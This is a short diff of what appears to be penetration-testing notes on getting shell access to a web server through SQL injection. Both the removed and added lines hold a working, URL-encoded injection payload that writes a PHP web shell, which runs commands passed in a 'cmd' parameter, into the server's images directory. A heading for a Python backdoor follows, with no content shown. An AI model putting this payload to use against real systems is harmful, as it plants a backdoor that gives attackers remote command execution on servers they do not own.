@@ -38,7 +38,7 @@ Gain Shell Access to Webserver with the Help of SQL Injection
 -------------------------------------------
 
 Inject SQL that will create a PHP script that will run passed commads:
-http://192.168.30.99/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
+http://192.168.30.99/login.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
 
 __PYTHON BACKDOOR__
 
